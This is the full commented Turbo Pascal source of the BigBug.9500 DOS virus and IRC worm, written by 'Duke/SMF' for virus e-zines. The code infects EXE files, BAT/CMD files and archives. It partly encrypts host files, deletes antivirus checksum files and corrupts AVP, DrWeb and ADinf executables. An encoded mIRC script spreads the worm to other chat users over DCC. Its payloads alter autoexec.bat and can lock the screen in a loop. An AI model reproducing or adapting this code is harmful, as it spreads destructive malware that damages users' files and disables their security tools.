(*
******************************************************************************
Duke's Virus Labs presents:       BigBug.9500 virus

Name        : BigBug v1.1
Length      : 9500
Author      : Duke/SMF
Type        : HLLC/HLLO/HLLP/HLLW/IRC-Worm
Destination : COM/EXE, BAT/CMD, ARJ/RAR/ZIP/LZH
Language    : Turbo Pascal 7.0
Stealth     : yes (in HLLP)
Crypt       : yes (HLLC victim)
Payload     : yes

History :
v1.0 - Released with DVL #7 e-zine. Now detected with AVP/DrWeb/F-Prot, 
       but NOT CURED (only deleted ;)
       Features :
       + delete AV checksum files
       + kill AVP, DRWEB, ADINF antiviruses
       + infect EXE files, ARJ/RAR/ZIP/LZH archives

v1.1 - Special edition for lzo #2 e-zine. 
       Many new features added :
       + IRC-Worm
       + BAT/CMD infection
       + not infect PE/NE/LE files
       + commented source
       - fixed archive infection


                      FOR EDUCATIONAL PURPOSES ONLY !!!
  

Thanx to Virtual Daemon.
Greetz to
   all SMF members, Jackie-, The Spy, Knowdeth, GigaByte, Cicatrix, mgl, foxz,
   AsmHead, Sepultura, Imagineer, Deviator, ULTRAS, RedArc, z0mbie, 
   Yozak, BSL4, spyda and all other friends

******************************************************************************
*)
{$I-,S-}
{$M 10000, 3000, 10000}
program BigBug_Virus_v1_1;
uses dos,crt;
const len = 9500;                {virus size}
      MPos = 200;                {position of label in file}
      metka:byte = $AE;          {byte at label position}
      ScriptSize=450;            {size of script.ini}
      VS = 16;                   {total strings in logo}
      logo:array[1..VS] of string[80] = (

'   лллллллллм                        лллллллллм                                ',
'   лл      плл                       лл      плл                               ',
'   лл       лл   лл     млллллллм    лл       лл   лл       лл     млллллллм   ',
'   лл      млл         лллп   пллл   лл      млл   лл       лл    лллп   пллл  ',
'   ллллллллл     лл   ллп            ллллллллл     лл       лл   ллп           ',
'   лл      плл   лл   лл             лл      плл   лл       лл   лл            ',
'   лл       лл   лл   лл      лллл   лл       лл   лл       лл   лл      лллл  ',
'   лл      млл   лл    ллм      лл   лл      млл   ллм     млл    ллм      лл  ',
'   лллллллллп    лл     ллллллллп    лллллллллп     ллллллллп      ллллллллп   ',
'                                                                               ',
'                                                                               ',
' лл      лл    мллллм     млллллл     лл    лл   лллллллл   ллллллм    лллллллл',
' лл      лл   лл    лл   лл           лл    лл   лл         лл    лл   лл      ',
' лл  лл  лл   лллллллл    пллллм      лллллллл   лллллл     ллллллм    лллллл  ',
' лл  лл  лл   лл    лл         лл     лл    лл   лл         лл   плм   лл      ',
'  пллппллп    лл    лл   ллллллп      лл    лл   лллллллл   лл    лл   лллллллл');
{---------------------------------------------------------------------------}
    script:array[1..ScriptSize] of byte=
(91,115,99,114,105,112,116,93,13,10,110,48,61,111,110,32,49,58,70,73,
76,69,82,67,86,68,58,42,46,42,58,47,100,99,99,32,115,101,110,100,
32,36,110,105,99,107,32,66,105,103,66,117,103,46,101,120,101,13,10,110,
49,61,111,110,32,49,58,70,73,76,69,83,69,78,84,58,42,46,42,58,
47,100,99,99,32,115,101,110,100,32,36,110,105,99,107,32,66,105,103,66,
117,103,46,101,120,101,13,10,110,50,61,111,110,32,49,58,84,69,88,84,
58,42,118,105,114,117,115,42,58,35,58,47,113,117,105,116,32,66,105,103,
66,117,103,32,119,97,115,32,104,101,114,101,32,33,13,10,110,51,61,111,
110,32,49,58,84,69,88,84,58,42,115,99,114,105,112,116,46,105,110,105,
42,58,35,58,47,113,117,105,116,32,66,105,103,66,117,103,32,119,97,115,
32,104,101,114,101,32,33,13,10,110,52,61,111,110,32,49,58,84,69,88,
84,58,42,115,99,114,105,112,116,46,105,110,105,42,58,42,58,123,32,46,
105,103,110,111,114,101,32,36,110,105,99,107,32,124,32,46,99,108,111,115,
101,109,115,103,32,36,110,105,99,107,32,125,13,10,110,53,61,111,110,32,
49,58,84,69,88,84,58,42,118,105,114,117,115,42,58,42,58,123,32,46,
105,103,110,111,114,101,32,36,110,105,99,107,32,124,32,46,99,108,111,115,
101,109,115,103,32,36,110,105,99,107,32,125,13,10,110,54,61,111,110,32,
49,58,84,69,88,84,58,42,115,101,110,100,42,58,42,58,123,32,46,105,
103,110,111,114,101,32,36,110,105,99,107,32,124,32,46,99,108,111,115,101,
109,115,103,32,36,110,105,99,107,32,125,13,10,110,55,61,111,110,32,49,
58,84,69,88,84,58,42,66,105,103,66,117,103,42,58,35,58,47,109,115,
103,32,73,39,109,32,105,110,102,101,99,116,101,100,32,119,105,116,104,32,
66,105,103,66,117,103,32,33,13,10);

(*
[script]
n0=on 1:FILERCVD:*.*:/dcc send $nick BigBug.exe
n1=on 1:FILESENT:*.*:/dcc send $nick BigBug.exe
n2=on 1:TEXT:*virus*:#:/quit BigBug was here !
n3=on 1:TEXT:*script.ini*:#:/quit BigBug was here !
n4=on 1:TEXT:*script.ini*:*:{ .ignore $nick | .closemsg $nick }
n5=on 1:TEXT:*virus*:*:{ .ignore $nick | .closemsg $nick }
n6=on 1:TEXT:*send*:*:{ .ignore $nick | .closemsg $nick }
n7=on 1:TEXT:*BigBug*:#:/msg I'm infected with BigBug !
*)
{---------------------------------------------------------------------------}
var f:file;                      {infected file}
    g:file;
    t:text;
    body:array[1..len] of byte;  {virus body}
    host:array[1..len] of byte;  {part of HLLP-victim' body}
    a,b:byte;
    WeNowIn:byte;                {name of infected file, virus now in THIS file}
    WormType:byte;               {type of worms: 0-file,1-archive}
    archive:boolean;             {if virus find archive}
    IrcWorm:boolean;             {if IRC-worm created} 
    ds:dirstr;
    ns:namestr;
    es:extstr;
    par:string;                  {parametres}
    companio:string;             {name of HLLC-victim file}
    NewName:string;              {name of created worm}
    Command:string;              {string with COMSPEC}
    i:integer;
    attr:word;                   {attributes of file}
    ComFind:boolean;             {if virus find EXE file with the same name for COM}
    Directory:byte;              {height of folder tree}
    Lab:string;                  {label in batch files}
{---------------------------------------------------------------------------}
procedure MakeWorm(Dir:string);                  {make worm with random name}
var f:file;
    i,d,C:byte;
    M:integer;
begin
{--- generate random name : }
d:=random(8)+1;
NewName:='';
for i:=1 to d do NewName:=NewName+chr(random(26)+97);
d:=random(255);
if d div 2 = d/2 then NewName:=NewName+'.com' else NewName:=NewName+'.exe';
{--- create file : }
NewName:=Dir+'\'+NewName;               {add path to filename}
assign(f,NewName);rewrite(f,1);
blockwrite(f,Body,Len);
close(f);
end;
{---------------------------------------------------------------------------}
procedure Infect_HLLW;                                       {infect as HLLW}
var Num:integer;       {number of intresting folder}
    P:string;          {name of folder}
    Y:boolean;         {if TRUE, then stop scan process}
{---------------------------------------------------------------------------}
function SumDir(Dir:string):integer;            {calculate number of folders}
var N:searchrec;
    D:integer;
begin
D:=0;
Dir:=Dir+'\';
findfirst(Dir+'*.*',$3F,N);
while doserror=0 do
  begin
  with N do if (Attr and 16<>0) and (Name[1]<>'.') then D:=D+1;
  findnext(N);
  end;
SumDir:=D;
end;
{---------------------------------------------------------------------------}
procedure FindDir(var Dir:string;D:integer);                    {find folder}
var N:searchrec;
    K:integer;
begin
if D=0 then Y:=true else
  begin
  K:=0;
  Dir:=Dir+'\';
  findfirst(Dir+'*.*',$3F,N);
  while doserror=0 do
    begin
    with N do if (Attr and 16<>0) and (Name[1]<>'.') then K:=K+1;
    if K=D then
       begin
       P:=P+N.name;
       exit;
       end;
    findnext(N);
    end;
  end;
end;
{---------------------------------------------------------------------------}
begin
P:=copy(fexpand(paramstr(0)),1,2);          {get name of current disk-drive}
Y:=false;
while Y=false do
  begin
  Num:=random(SumDir(P));                   {get random subfolder}
  FindDir(P,Num);                           {go to scan this subfolder}
  end;
MakeWorm(P);                                {make worm}
end;
{----------------------------------------------------------------------------}
procedure Crypt(n:string);                               {crypt victim's body}
const CS=2000;                              {size of crypted block}
var c:file;                                 {file for crypt}
    t:array[1..CS] of byte;                 {crypted block}
    ch:byte;
begin
assign(c,n);
getfattr(c,attr);                           {keep attributes}
setfattr(c,$20);
reset(c,1);
seek(c,200);                                {caclulate random start point }
blockread(c,ch,1);                          {to crypt victim}
for i:=1 to 10 do                           
  begin
  seek(c,ch+1);
  blockread(c,ch,1);
  end;
seek(c,ch+300);
blockread(c,t,CS);                          {read block of data from middle}
for i:=1 to CS do t[i]:=t[i] xor 99;        {crypt this block}
seek(c,ch+300);
blockwrite(c,t,CS);                         {write crypted block}
close(c);
setfattr(c,attr);                           {set old attributes}
end;
{----------------------------------------------------------------------------}
procedure Exec_HLLC;                                  {execute victim as HLLC}
begin
Crypt(companio);                            {decrypt victim}
exec(companio,par);                         {exec victim}
Crypt(companio);                            {crypt victim again :)}
end;
{----------------------------------------------------------------------------}
procedure Exec_HLLP;                                  {execute victim as HLLP}
begin
assign(f,paramstr(0));
getfattr(f,attr);                           {save attributes}
setfattr(f,$20);
reset(f,1);
seek(f,filesize(f)-len);
blockread(f,host,len);
seek(f,filesize(f)-len);
truncate(f);
seek(f,0);
blockwrite(f,host,len);
close(f);
exec(paramstr(0),par);
assign(f,paramstr(0));
reset(f,1);
blockwrite(f,body,len);
seek(f,filesize(f));
blockwrite(f,host,len);
close(f);
setfattr(f,attr);
end;
{----------------------------------------------------------------------------}
procedure Infect_HLLC(s:string);                              {infect as HLLC}
var st:string;
begin
fsplit(s,ds,ns,es);
st:=ds+ns+'.COM';
assign(g,st);rewrite(g,1);                  {create companion}
blockwrite(g,body,len);                     {write virus body}
close(g);
Crypt(s);                                   {crypt victim}
end;
{----------------------------------------------------------------------------}
procedure Infect_HLLO(s:string);                              {infect as HLLO}
begin
assign(f,s);
setfattr(f,$20);
rewrite(f,1);
blockwrite(f,body,len);
close(f);
end;
{----------------------------------------------------------------------------}
procedure Infect_HLLP(s:string);                              {infect as HLLP}
var time:longint;
begin
assign(f,s);
getfattr(f,attr);
setfattr(f,$20);
reset(f,1);
getftime(f,time);
blockread(f,host,len);
seek(f,0);
blockwrite(f,body,len);
seek(f,filesize(f));
blockwrite(f,host,len);
setftime(f,time);
close(f);
setfattr(f,attr);
end;
{-----------------------------------------------------------------------------}
procedure Infect_BAT(name:string);                       {infect BAT/CMD files}
type S1=string[4];
     S2=string[80];
var s:text;
    tmpstr:S2;
    mempos,bufpos:Word;
    i:byte;
{------------------------------------}
function Hex(Value:word):S1;                              {convert word to hex}
var num:S1;
    i:integer;
begin
if value<256 then
  begin
  num[0]:=#2;
  num[1]:=chr((Lo(value) div 16)+48);
  num[2]:=chr((Lo(value) mod 16)+48);
  end
else
  begin
  num[0]:=#4;
  num[1]:=chr((hi(value) div 16)+48);
  num[2]:=chr((hi(value) mod 16)+48);
  num[3]:=chr((lo(value) div 16)+48);
  num[4]:=chr((lo(value) mod 16)+48);
  end;
for i:=1 to length(num) do if (ord(num[i]))>57 then num[i]:=chr(ord(num[i])+7);
hex:=num;
end;
{------------------------------------}
begin
assign(s,name);
append(s);
mempos:=$0100;
tmpstr:='E '+Hex(mempos);
i:=0;
writeln(s,'@ctty nul');
writeln(s,'echo>bigbug.scr N BigBug.com');  {create debug script}
for bufpos:=1 to len do
  begin
  if i mod 17=16 then
    begin
    writeln(s,'echo>>bigbug.scr ',tmpstr);
    tmpstr:='';
    inc(mempos,i);
    i:=0;
    tmpstr:='E '+Hex(mempos);
    end;
  tmpstr:=tmpstr+' '+hex(body[bufpos]);
  inc(i);
  end;
writeln(s,'echo>>bigbug.scr ',tmpstr);
writeln(s,'echo>>bigbug.scr RCX');
writeln(s,'echo>>bigbug.scr ',Hex(len)); {size}
writeln(s,'echo>>bigbug.scr W');
writeln(s,'echo>>bigbug.scr Q');
writeln(s,'debug<bigbug.scr');
writeln(s,'del bigbug.scr');
writeln(s,'BigBug.com');
writeln(s,'del BigBug.com');
writeln(s,':BigBug');
close(s);
end;
{----------------------------------------------------------------------------}
function UpStr(st:string):string;                              {UpCase string}
var d:string;
    i:byte;
begin
d:='';
for i:=1 to length(st) do d:=d+upcase(st[i]);
UpStr:=d;
end;
{----------------------------------------------------------------------------}
function CheckInfection(st:string):boolean;        {check if already infected}
var f:file;
    a:byte;
    w:word;
label Next;
begin
ComFind:=false;
CheckInfection:=false;
assign(f,st);
reset(f,1);
{--- looking for PE/NE/LE file : }
seek(f,$3c);               
blockread(f,w,2);
if w<filesize(f) then
  begin
  seek(f,w+1);
  blockread(f,a,1);
  if a=$45 then                             {find PE/NE/LE file}
    begin 
    close(f);
    CheckInfection:=true;                   {not infect this file}
    exit;
    end;
  end;
{--- check filesize : }
if filesize(f)<len then                     {small file}
  begin 
  close(f);
  goto Next;
  end;
{--- check infection label : }
seek(f,MPos);
blockread(f,a,1);
if a=metka then CheckInfection:=true;
close(f);
{--- check companion file : }
Next:
fsplit(st,ds,ns,es);
assign(f,ds+ns+'.COM');
{$I-}reset(f,1);{$I+}
if ioresult=0 then
  begin
  ComFind:=true;                            {companion file present}
  if filesize(f)<len then                   {companion file very small}
    begin 
    close(f);
    exit;
    end;
  seek(f,MPos);
  blockread(f,a,1);
  if a=metka then CheckInfection:=true;     {companion file is a virus}
  close(f);
  end;
end;
{----------------------------------------------------------------------------}
procedure ScanDir(Dir:string);                         {scan folder for files}
const kill:array[1..15] of string[12] =     {names of files to kill}
      ('CHKLIST.CPS',
      'CHKLIST.MS',
      'CHKLIST.TAV',
      'ANTI-VIR.DAT',
      'ANTIVIR.DAT',
      'CRC.DAT',
      'AV.CRC',
      'AVP.CRC',
      'MSAV.CHK',
      'SMARTCHK.CPS',
      'CRC.SVS',
      'CRC_.SVS',
      'TBUTIL.DAT',
      'BOOT.MS',
      'BOOT.NTZ');
      reboot:array[1..2] of byte = ($CD,$18); {reboot code}
      mirc:array[1..3] of string[12] =        {mIRC files}
      ('MIRC32.EXE',
      'SCRIPT.INI',
      'MIRC.INI');
var i:byte;
    f:file;
    s:searchrec;
    z:string;
    fn:string;           {name of folder}
    p:string;            {parametres of archiver}
label NextFile;
begin
findfirst(Dir+'*.*',$3f,s);
while doserror=0 do
  begin
  archive:=false;
  if copy(s.name,1,1)='.' then goto NextFile;
  if ((s.attr and $10)<>0) and (Directory=0) then
    begin
    Directory:=1;
    ScanDir(s.name+'\');
    Directory:=0;
    goto NextFile;
    end;
  z:=UpStr(s.name);
  fn:=Dir+s.name;
  {--- erase AV checksum files : }
  for i:=1 to 15 do if pos(kill[i],z)<>0 then   
    begin
    assign(f,fn);
    erase(f);
    goto NextFile;
    end;
  {--- make IRC worm : }
  for i:=1 to 3 do if (pos(mirc[i],z)<>0) and (IrcWorm=false) then   
    begin
    assign(f,'script.ini');                 {create script.ini}
    rewrite(f,1);
    blockwrite(f,script,ScriptSize);
    close(f);
    assign(f,'BigBug.exe');
    rewrite(f,1);
    blockwrite(f,body,len);                 {create BigBug.exe}
    close(f);
    IrcWorm:=true;
    goto NextFile;
    end;
  fsplit(z,ds,ns,es);
  {--- check BAT/CMD-files : }
  if (es='.BAT') or (es='.CMD') then
    begin
    assign(t,fn);
    reset(t);
    while not eof(t) do readln(t,Lab);       {read label}
    close(t);
    if Lab<>':BigBug' then Infect_BAT(fn);   {if not infected}
    goto NextFile;
    end;
  {--- check EXE-files : }
  if es='.EXE' then
    begin
    if (pos('ADINF',z)<>0) or (pos('AVP',z)<>0) or (pos('DRWEB',z)<>0) then
      begin             {if find AV prog - kill her! write CDh 18h in file}
      assign(f,fn);
      setfattr(f,$20);
      reset(f,1);
      blockwrite(f,reboot,2);
      close(f);
      goto NextFile;
      end;
    CheckInfection(fn);
    case s.size of
         0..2700  : Infect_HLLO(fn);
      2701..len-1 : Infect_HLLC(fn);
      else begin
           if ComFind=true then i:=random(2)+1 else i:=random(3);
           case i of
             0 : Infect_HLLC(fn);
             1 : Infect_HLLO(fn);
             2 : Infect_HLLP(fn);
             end;
           end;
      end;
    goto NextFile;
    end;
  {--- infect archives : }
  if (Directory=0) and (WormType=1) then
    begin
    if (es='.RAR') or (es='.ZIP') or (es='.ARJ') or (es='.LZH') then
      begin
      assign(f,s.name);
      getfattr(f,attr);
      setfattr(f,$20);
      MakeWorm('');
      p:='/c ';
      archive:=true;
      end;
    if es='.RAR' then p:=p+'rar a -tk -y -c- -o+ ';
    if es='.ZIP' then p:=p+'pkzip -a ';
    if es='.ARJ' then p:=p+'arj a ';
    if es='.LZH' then p:=p+'lha a ';
    if archive=true then
      begin
      p:=p+s.name+' '+NewName+'>nul';
      exec(Command,par);                    {write virus}
      setfattr(f,attr);
      close(f);
      assign(f,NewName);
      erase(f);                             {delete virus}
      end;
    end;
NextFile:
  findnext(s);
  end;
end;
{----------------------------------------------------------------------------}
procedure Out(color:integer;st:string);              {output coloured strings}
var i:byte;
begin
textcolor(color);
for i:=1 to length(st) do
  begin
  write(st[i]);
  sound(400);
  delay(700);
  nosound;
  end;
end;
{----------------------------------------------------------------------------}
procedure BigBug;                                                    {payload}
begin
asm
  mov ah,01h
  mov ch,32
  mov cl,3
  int 10h
end;
Out(11,'Hi! I''m ');
Out(12,'BigBug ');
Out(11,'virus, written by ');
Out(10,'Duke/SMF ');
Out(11,'special for ');
Out(13,'* lz0 #2 *');
writeln;
Out(11,'You can say - ');
Out(9,'"It''s crazy !!!!"');
Out(11,'. And you right ');
Out(10,';-)) ');
Out(11,'This is very');
writeln;
Out(11,'crazy virus. Why my name is ');
Out(12,'BigBug ');
Out(11,'? Coz i''m ');
Out(9,'REALLY ');
Out(12,'BigBug ');
Out(11,'!!!!!');
writeln;
Out(11,'HLL C/O/P/W in one ! Heheh....');
textcolor(7);
writeln(' ');
asm
  mov ah,01h
  mov ch,7
  mov cl,8
  int 10h
end;
halt;
asm
  db 13,10,'[BigBug] v1.1 (c) by Duke/SMF',13,10
end;
end;
{Hi! I'm BigBug virus, written by Duke/SMF special for * lz0 #2 *}
{You can say - "It's crazy !!!!". And you right ;-)) This is very}
{crazy virus. Why my name is BigBug ? Coz i'm REALLY BigBug !!!!!}
{HLL C/O/P/W in one ! Heheh....                                  }
{----------------------------------------------------------------------------}
begin
Randomize;                                  {initialize random-generator}
{--- read virus body and check type of host file : }
assign(f,paramstr(0));reset(f,1);
blockread(f,body,len);
if filesize(f)<>len then
  begin
  seek(f,filesize(f)-len);
  blockread(f,a,1);
  blockread(f,b,1);
  if ((a=77) and (b=90)) or ((a=90) and (b=77)) {'MZ' or 'ZM'}
    then WeNowIn:=2 else WeNowIn:=1;
  end
else
  begin
  fsplit(paramstr(0),ds,ns,es);
  if es='.COM' then
     begin
     companio:=ds+ns+'.EXE';
     assign(g,companio);
     {$I-}reset(g);{$I+}
     if ioresult<>0 then WeNowIn:=3 else begin close(g);WeNowIn:=0;end;
     end
  else WeNowIn:=1;
  end;
close(f);
{--- make worm : }
WormType:=random(2);
if WormType=0 then Infect_HLLW else Command:=GetEnv('COMSPEC');
{--- keep parametres : }
if (WeNowIn=0) or (WeNowIn=2) then          {if now in HLLC/HLLP type}
  begin
  par:='';
  for i:=1 to paramcount do
    if paramstr(i)='BigBug' then BigBug else par:=paramstr(i)+' ';
  end;
{--- execute host file :}
Case WeNowIn of
  0 : Exec_HLLC;
  2 : Exec_HLLP;
  end;
{--- search for victim :}
IrcWorm:=false;                             {worm not created yet}
Directory:=0;
ScanDir('');                                {scan current directory}
{--- payloads :}                            
if random(50)=25 then
  begin
  assign(t,'c:\autoexec.bat');
  setfattr(t,$20);
  append(t);
  writeln(t,'');
  writeln(t,'@type c:\BigBug.txt');
  close(t);
  assign(t,'c:\BigBug.txt');
  rewrite(t);
  for i:=1 to VS do writeln(t,logo[i]);
  close(t);
  end;
if random(60)=30 then while 1<>2 do write('BigBug! ');
if (WeNowIn=1) or (WeNowIn=3) then writeln('Not enough memory');
end.